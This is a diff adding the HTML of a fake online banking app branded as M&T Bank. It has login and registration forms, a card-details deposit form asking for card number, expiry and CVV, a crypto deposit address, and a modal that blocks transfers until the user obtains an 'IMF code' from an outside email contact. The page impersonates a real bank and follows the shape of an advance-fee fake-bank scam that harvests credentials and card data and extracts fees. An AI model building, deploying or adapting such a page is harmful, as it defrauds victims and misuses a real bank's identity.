@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>M&T BANK Banking</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <!-- Add header to login container -->
+    <div class="login-container" id="login-container">
+        <div class="auth-header">
+            <div class="logo">
+                <h1>M&T BANK</h1>
+            </div>
+            <div class="auth-links">
+                <a href="landing.html">Home</a>
+                <a href="#">About</a>
+                <a href="#">Contact</a>
+            </div>
+        </div>
+        <div class="login-form">
+            <h1>M&T BANK</h1>
+            <form id="login-form">
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Login</button>
+            </form>
+            <p>Don't have an account? <a href="#" id="register-link">Register</a></p>
+        </div>
+    </div>
+
+    <!-- Add header to register container -->
+    <div class="register-container" id="register-container" style="display: none;">
+        <div class="auth-header">
+            <div class="logo">
+                <h1>M&T BANK</h1>
+            </div>
+            <div class="auth-links">
+                <a href="#">Home</a>
+                <a href="#">About</a>
+                <a href="#">Contact</a>
+            </div>
+        </div>
+        <div class="register-form">
+            <h1>Create Account</h1>
+            <form id="register-form">
+                <div class="input-group">
+                    <input type="text" id="fullname" placeholder="Full Name" required>
+                </div>
+                <div class="input-group">
+                    <input type="email" id="reg-email" placeholder="Email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="reg-password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="register-btn">Register</button>
+            </form>
+            <p>Already have an account? <a href="#" id="login-link">Login</a></p>
+        </div>
+    </div>
+
+    <div class="dashboard-container" id="dashboard-container" style="display: none;">
+        <!-- Header -->
+        <header>
+            <div class="menu-toggle">
+                <i class="fas fa-bars"></i>
+            </div>
+            <h1 class="logo-text">M&T BANK</h1>
+            <div class="header-icons">
+                <div class="notification-icon">
+                    <i class="fas fa-bell"></i>
+                </div>
+                <div class="profile-icon" id="profile-initial">
+                    PB
+                </div>
+            </div>
+        </header>
+
+        <!-- Sidebar -->
+        <div class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <div class="user-info">
+                    <div class="profile-icon" id="sidebar-avatar">PB</div>
+                    <div>
+                        <h3 id="sidebar-username">Peter</h3>
+                        <p id="sidebar-account-number">Acc No: 8469009707</p>
+                    </div>
+                </div>
+                <div class="close-sidebar">
+                    <i class="fas fa-times"></i>
+                </div>
+            </div>
+            <div class="sidebar-balance">
+                <p>Available Balance</p>
+                <h2 id="sidebar-balance">$0 USD</h2>
+            </div>
+            <ul class="sidebar-menu">
+                <li class="sidebar-menu-item active" data-page="dashboard">
+                    <i class="fas fa-home"></i>
+                    <span>Dashboard</span>
+                </li>
+                <li class="sidebar-menu-item" data-page="profile">
+                    <i class="fas fa-user"></i>
+                    <span>Profile</span>
+                </li>
+                <li class="sidebar-menu-item" data-page="domestic-transfer">
+                    <i class="fas fa-paper-plane"></i>
+                    <span>Send Money</span>
+                </li>
+                <li class="sidebar-menu-item" data-page="deposit">
+                    <i class="fas fa-plus"></i>
+                    <span>Deposit</span>
+                </li>
+                <li class="sidebar-menu-item" data-page="history">
+                    <i class="fas fa-history"></i>
+                    <span>Transaction History</span>
+                </li>
+                <li class="sidebar-menu-item" data-page="cards">
+                    <i class="fas fa-credit-card"></i>
+                    <span>Cards</span>
+                </li>
+                <li class="sidebar-menu-item" id="logout-btn">
+                    <i class="fas fa-sign-out-alt"></i>
+                    <span>Logout</span>
+                </li>
+            </ul>
+        </div>
+
+        <!-- Main Content -->
+        <main id="main-content">
+            <!-- Dashboard Page -->
+            <div class="page active" id="dashboard-page">
+                <div class="balance-card">
+                    <div class="user-greeting">
+                        <div class="user-avatar" id="user-avatar">
+                            PB
+                        </div>
+                        <div class="greeting-text">
+                            <h3>Good Morning</h3>
+                            <h2 id="username">Peter</h2>
+                        </div>
+                    </div>
+                    <div class="date-time">
+                        <div class="time" id="current-time">08:40:09</div>
+                        <div class="date" id="current-date">Monday 7 April 2025</div>
+                    </div>
+                    <div class="balance-label">Available Balance</div>
+                    <div class="balance-amount" id="balance">$0 USD</div>
+                    <div class="account-details">
+                        <div class="account-number">
+                            <div class="account-number-label">Your Account Number</div>
+                            <div class="account-number-value">
+                                <span id="account-number">8469009707</span>
+                                <span class="status-badge active" id="account-status">Active</span>
+                            </div>
+                        </div>
+                        <div class="account-actions">
+                            <button class="action-button" id="transactions-btn">
+                                <i class="fas fa-exchange-alt"></i> Transactions
+                            </button>
+                            <button class="action-button" id="topup-btn">
+                                <i class="fas fa-arrow-up"></i> Top up
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <h2 class="section-title">What would you like to do today?</h2>
+                <p class="section-subtitle">Choose from our popular actions below</p>
+
+                <div class="quick-actions">
+                    <div class="action-item" id="account-info-btn" data-page="profile">
+                        <div class="action-icon">
+                            <i class="fas fa-file-alt"></i>
+                        </div>
+                        <p>Account Info</p>
+                    </div>
+                    <div class="action-item" id="send-money-btn" data-page="domestic-transfer">
+                        <div class="action-icon">
+                            <i class="fas fa-paper-plane"></i>
+                        </div>
+                        <p>Send Money</p>
+                    </div>
+                    <div class="action-item" id="deposit-btn" data-page="deposit">
+                        <div class="action-icon">
+                            <i class="fas fa-plus"></i>
+                        </div>
+                        <p>Deposit</p>
+                    </div>
+                    <div class="action-item" id="history-btn" data-page="history">
+                        <div class="action-icon">
+                            <i class="fas fa-history"></i>
+                        </div>
+                        <p>History</p>
+                    </div>
+                </div>
+
+                <!-- Cards Section -->
+                <div class="cards-section">
+                    <div class="section-header">
+                        <h2><i class="fas fa-credit-card"></i> Your Cards</h2>
+                        <a href="#" class="view-all">View all <i class="fas fa-chevron-right"></i></a>
+                    </div>
+                    <div class="no-cards">
+                        <div class="no-cards-icon">
+                            <i class="fas fa-credit-card"></i>
+                        </div>
+                        <h3>No cards yet</h3>
+                        <p>You haven't applied for any virtual cards yet. Apply for a new card to get started with secure online payments.</p>
+                        <button class="apply-card-btn">
+                            <i class="fas fa-plus"></i> Apply for Card
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Transactions Section -->
+                <div class="transactions-section">
+                    <div class="section-header">
+                        <h2><i class="fas fa-exchange-alt"></i> Recent Transactions</h2>
+                        <a href="#" class="view-all">View all <i class="fas fa-chevron-right"></i></a>
+                    </div>
+                    <div class="no-transactions">
+                        <div class="no-transactions-icon">
+                            <i class="fas fa-inbox"></i>
+                        </div>
+                        <h3>No transactions yet</h3>
+                        <p>Your transaction history will appear here</p>
+                        <button class="make-deposit-btn">
+                            Make your first deposit
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Other pages will be added here -->
+            <!-- Profile Page -->
+            <div class="page" id="profile-page">
+                <div class="profile-header">
+                    <div class="profile-avatar" id="profile-page-avatar">
+                        <i class="fas fa-user"></i>
+                    </div>
+                    <h2 id="profile-name">Peter</h2>
+                    <p id="profile-account">Account: <span id="profile-account-number">8469009707</span></p>
+                </div>
+                
+                <div class="profile-details">
+                    <div class="profile-item">
+                        <label>Full Name</label>
+                        <p id="profile-fullname">Peter</p>
+                    </div>
+                    <div class="profile-item">
+                        <label>Email</label>
+                        <p id="profile-email">peter@example.com</p>
+                    </div>
+                    <div class="profile-item">
+                        <label>Account Status</label>
+                        <p><span class="status active">Active</span></p>
+                    </div>
+                    <div class="profile-item">
+                        <label>Date Joined</label>
+                        <p id="profile-date">April 8, 2025</p>
+                    </div>
+                </div>
+                
+                <div class="profile-actions">
+                    <div class="profile-action-card">
+                        <h3>Change Password</h3>
+                        <form id="password-form">
+                            <div class="input-group">
+                                <label for="current-password">Current Password</label>
+                                <input type="password" id="current-password" required>
+                            </div>
+                            <div class="input-group">
+                                <label for="new-password">New Password</label>
+                                <input type="password" id="new-password" required>
+                            </div>
+                            <div class="input-group">
+                                <label for="confirm-password">Confirm Password</label>
+                                <input type="password" id="confirm-password" required>
+                            </div>
+                            <button type="submit" class="change-password-btn">Update Password</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Transfer Page -->
+            <div class="page" id="domestic-transfer-page">
+                <div class="page-header">
+                    <h2>Send Money</h2>
+                    <p>Transfer funds to another account</p>
+                </div>
+                
+                <div class="transfer-card">
+                    <form id="domestic-transfer-form" class="transfer-form">
+                        <div class="input-group">
+                            <label for="domestic-recipient">Recipient Account Number or Email</label>
+                            <input type="text" id="domestic-recipient" placeholder="Enter account number or email" required>
+                        </div>
+                        
+                        <div class="input-group">
+                            <label for="domestic-amount">Amount</label>
+                            <input type="number" id="domestic-amount" placeholder="Enter amount" required min="1">
+                        </div>
+                        
+                        <div class="input-group">
+                            <label for="domestic-description">Description (Optional)</label>
+                            <input type="text" id="domestic-description" placeholder="What's this for?">
+                        </div>
+                        
+                        <button type="submit" class="transfer-btn">Send Money</button>
+                    </form>
+                </div>
+                
+                <div class="recent-transfers">
+                    <h3>Recent Transfers</h3>
+                    <div class="no-transfers" id="no-transfers">
+                        <i class="fas fa-paper-plane"></i>
+                        <p>No recent transfers</p>
+                    </div>
+                    <div class="transfers-list" id="transfers-list">
+                        <!-- Transfers will be added here dynamically -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Deposit Page -->
+            <div class="page" id="deposit-page">
+                <div class="page-header">
+                    <h2>Deposit Funds</h2>
+                    <p>Add money to your account</p>
+                </div>
+                
+                <div class="deposit-card">
+                    <div class="deposit-methods">
+                        <h3>Select Deposit Method</h3>
+                        <div class="method-options">
+                            <div class="method-option active" data-method="card">
+                                <i class="fas fa-credit-card"></i>
+                                <span>Card</span>
+                            </div>
+                            <div class="method-option" data-method="bank">
+                                <i class="fas fa-university"></i>
+                                <span>Bank Transfer</span>
+                            </div>
+                            <div class="method-option" data-method="crypto">
+                                <i class="fab fa-bitcoin"></i>
+                                <span>Crypto</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <form id="deposit-form" class="deposit-form">
+                        <div class="input-group">
+                            <label for="deposit-amount">Amount</label>
+                            
+                        
+                        <div class="card-details" id="card-details">
+                            <div class="input-group">
+                                <label for="card-number">Card Number</label>
+                                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
+                            </div>
+                            
+                            <div class="input-row">
+                                <div class="input-group">
+                                    <label for="expiry-date">Expiry Date</label>
+                                    <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5">
+                                </div>
+                                
+                                <div class="input-group">
+                                    <label for="cvv">CVV</label>
+                                    <input type="text" id="cvv" placeholder="123" maxlength="3">
+                                </div>
+                            </div>
+                            
+                            <div class="input-group">
+                                <label for="card-name">Name on Card</label>
+                                <input type="text" id="card-name" placeholder="John Doe">
+                            </div>
+                        </div>
+                        
+                        <div class="bank-details" id="bank-details" style="display: none;">
+                            <div class="bank-info">
+                                <h4>Bank Transfer Details</h4>
+                                <p>Transfer to the account below:</p>
+                                <div class="bank-detail-item">
+                                    <span>Bank Name:</span>
+                                    <strong>M&T BANK Bank</strong>
+                                </div>
+                                <div class="bank-detail-item">
+                                    <span>Account Number:</span>
+                                    <strong>8469009707</strong>
+                                </div>
+                                <div class="bank-detail-item">
+                                    <span>Account Name:</span>
+                                    <strong id="bank-account-name">Peter</strong>
+                                </div>
+                                <div class="bank-detail-item">
+                                    <span>Reference:</span>
+                                    <strong id="bank-reference">DEP-8469009707</strong>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="crypto-details" id="crypto-details" style="display: none;">
+                            <div class="crypto-info">
+                                <h4>Crypto Deposit</h4>
+                                <p>Send to the wallet address below:</p>
+                                <div class="qr-code">
+                                    <i class="fas fa-qrcode"></i>
+                                </div>
+                                <div class="wallet-address">
+                                    <span>BTC Address:</span>
+                                    <div class="address-copy">
+                                        <code>bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</code>
+                                        <button type="button" class="copy-btn"><i class="far fa-copy"></i></button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <button type="submit" class="deposit-btn" id="deposit-submit-btn">Deposit Now</button>
+                    </form>
+                </div>
+                
+                <div class="recent-deposits">
+                    <h3>Recent Deposits</h3>
+                    <div class="no-deposits" id="no-deposits">
+                        <i class="fas fa-inbox"></i>
+                        <p>No recent deposits</p>
+                    </div>
+                    <div class="deposits-list" id="deposits-list">
+                        <!-- Deposits will be added here dynamically -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- History Page -->
+            <div class="page" id="history-page">
+                <div class="page-header">
+                    <h2>Transaction History</h2>
+                    <p>View all your transactions</p>
+                </div>
+                
+                <div class="history-filters">
+                    <div class="filter-group">
+                        <label for="transaction-type">Type</label>
+                        <select id="transaction-type">
+                            <option value="all">All</option>
+                            <option value="credit">Credit</option>
+                            <option value="debit">Debit</option>
+                        </select>
+                    </div>
+                    <div class="filter-group">
+                        <label for="date-range">Date Range</label>
+                        <select id="date-range">
+                            <option value="all">All Time</option>
+                            <option value="today">Today</option>
+                            <option value="week">This Week</option>
+                            <option value="month">This Month</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="history-table-container">
+                    <table class="history-table">
+                        <thead>
+                            <tr>
+                                <th>Date</th>
+                                <th>Description</th>
+                                <th>Amount</th>
+                                <th>Type</th>
+                                <th>Status</th>
+                            </tr>
+                        </thead>
+                        <tbody id="history-table-body">
+                            <!-- Transaction history will be added here dynamically -->
+                        </tbody>
+                    </table>
+                </div>
+                
+                <div class="no-history" id="no-history">
+                    <div class="no-history-icon">
+                        <i class="fas fa-history"></i>
+                    </div>
+                    <h3>No transactions yet</h3>
+                    <p>Your transaction history will appear here</p>
+                </div>
+            </div>
+        </main>
+
+        <!-- Center Button -->
+        <div class="center-button">
+            <i class="fas fa-th"></i>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <nav class="bottom-nav">
+            <a href="#" class="nav-item active" data-page="dashboard">
+                <i class="fas fa-home"></i>
+                <span>Home</span>
+            </a>
+            <a href="#" class="nav-item" data-page="stats">
+                <i class="fas fa-chart-bar"></i>
+                <span>Stats</span>
+            </a>
+            <a href="#" class="nav-item" data-page="cards">
+                <i class="fas fa-credit-card"></i>
+                <span>Cards</span>
+            </a>
+            <a href="#" class="nav-item" data-page="profile">
+                <i class="fas fa-user"></i>
+                <span>Profile</span>
+            </a>
+        </nav>
+    </div>
+
+    <!-- Browser Navigation -->
+    <div class="browser-nav">
+        <button><i class="fas fa-chevron-left"></i></button>
+        <button><i class="fas fa-chevron-right"></i></button>
+        <button><i class="fas fa-share"></i></button>
+        <button><i class="fas fa-book"></i></button>
+        <button><i class="far fa-clone"></i></button>
+    </div>
+
+    <!-- IMF Verification Modal -->
+    <div class="modal" id="imf-verification-modal">
+        <div class="modal-content imf-modal">
+            <div class="modal-body">
+                <div class="imf-content">
+                    <div class="imf-icon">
+                        <i class="fas fa-info"></i>
+                    </div>
+                    <h2>Before you proceed!</h2>
+                    <p>The IMF code is required to enable you to continue with this transaction. Please contact any of our nearest branches or our online customer care on representative with support@perfectdemo.info: they will help you with the appropriate IMF code for this transaction.</p>
+                
+                    <div class="imf-input-section">
+                        <label for="imf-code-input">IMF Code</label>
+                        <input type="text" id="imf-code-input" placeholder="Enter IMF code" required>
+                    </div>
+                
+                    <button type="button" class="confirm-imf-btn" id="confirm-imf-btn">Confirm IMF code</button>
+                    <button type="button" class="back-dashboard-btn" id="back-dashboard-btn">
+                        <i class="fas fa-arrow-left"></i> Back to dashboard
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Coming Soon Modal -->
+    <div class="modal" id="coming-soon-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Coming Soon</h2>
+                <span class="close-modal">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="coming-soon-content">
+                    <i class="fas fa-rocket"></i>
+                    <h3 id="coming-soon-title">Feature Coming Soon</h3>
+                    <p id="coming-soon-message">We're working hard to bring you this feature. Please check back later!</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+<!-- Begin of Chaport Live Chat code --> <script type="text/javascript"> (function(w,d,v3){ w.chaportConfig = { appId : '67e3fbee67f4de4398a35c98' };  if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document); </script> <!-- End of Chaport Live Chat code -->
+    <!-- Transaction Receipt Modal -->
+    <div class="modal" id="receipt-modal">
+        <div class="modal-content receipt-modal">
+            <div class="modal-header">
+                <h2>Transaction Receipt</h2>
+                <span class="close-modal">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="receipt-content">
+                    <div class="receipt-logo">
+                        <h2>M&T BANK</h2>
+                    </div>
+                    <div class="receipt-status">
+                        <div class="receipt-icon success">
+                            <i class="fas fa-check"></i>
+                        </div>
+                        <h3>Transfer Successful</h3>
+                    </div>
+                    <div class="receipt-details">
+                        <div class="receipt-item">
+                            <span class="receipt-label">Amount</span>
+                            <span class="receipt-value" id="receipt-amount">$0.00</span>
+                        </div>
+                        <div class="receipt-item">
+                            <span class="receipt-label">Recipient</span>
+                            <span class="receipt-value" id="receipt-recipient">John Doe</span>
+                        </div>
+                        <div class="receipt-item">
+                            <span class="receipt-label">Account Number</span>
+                            <span class="receipt-value" id="receipt-account">0000000000</span>
+                        </div>
+                        <div class="receipt-item">
+                            <span class="receipt-label">Description</span>
+                            <span class="receipt-value" id="receipt-description">Transfer</span>
+                        </div>
+                        <div class="receipt-item">
+                            <span class="receipt-label">Date & Time</span>
+                            <span class="receipt-value" id="receipt-date">June 5, 2025 12:30 PM</span>
+                        </div>
+                        <div class="receipt-item">
+                            <span class="receipt-label">Reference</span>
+                            <span class="receipt-value" id="receipt-reference">TRF-123456</span>
+                        </div>
+                    </div>
+                    <div class="receipt-actions">
+                        <button class="share-receipt-btn" id="share-receipt-btn">
+                            <i class="fas fa-share-alt"></i> Share Receipt
+                        </button>
+                        <button class="close-receipt-btn" id="close-receipt-btn">
+                            <i class="fas fa-check"></i> Done
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
